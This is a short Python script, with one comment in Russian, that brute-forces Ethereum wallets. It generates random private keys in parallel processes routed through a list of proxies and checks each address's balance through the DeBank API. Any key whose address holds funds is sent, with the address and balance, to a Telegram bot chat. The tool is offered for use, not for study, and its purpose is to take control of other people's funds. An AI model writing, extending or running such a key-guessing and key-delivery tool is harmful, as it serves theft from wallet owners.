from eth_account import Account
from multiprocessing import Pool
import secrets
import requests
import json

def _telegram(text):
	data = {'chat_id': 'CHATID', 'text':text, 'parse_mode':'html'}
	r = requests.get(f'https://api.telegram.org/bot{BOTTOKEN}/sendMessage', data=data)

def doDebank(wallet, proxy):
	_url = "https://openapi.debank.com/v1/user/total_balance?id={}"
	_proxyString = {"https": proxy}
	r = requests.get(_url.format(wallet), proxies=_proxyString)
	obj = json.loads(r.text)
	if int(obj['total_usd_value']) > 0:
		return int(obj['total_usd_value'])
	else:
		return 0

def doWork(args):
	_i = 0
	while True:
		try:
			_i+=1
			priv = secrets.token_hex(32)
			private_key = "0x" + priv
			acct = Account.from_key(private_key)

			_debank = doDebank(acct.address, args)
			if _debank > 0:
				print(_i, acct.address, private_key, _debank)
				text = "<b>WalletGen</b>\n<code>{}</code>\n<code>{}</code>\nBalance: <code>{}</code>"
				_telegram(text.format(acct.address, private_key, _debank))
			else:
				print(_i, acct.address, private_key, _debank, end="\r")

		except Exception as ex:
			print(ex)
			_telegram("<code>WalletBruteError</code>\n{}".format(ex))
			continue
		
if __name__ == '__main__':
	with open("proxy.txt", "r") as f: file = f.readlines()
	_proxy = [line.strip() for line in file]
	_core = len(_proxy) # Сколько прокси - столько и процессов.
	_settings = [] # Настройки для процессов

	with Pool(processes=_core) as p:
		for _p in _proxy:
			_settings.append((_p))
		p.map(doWork, _settings)
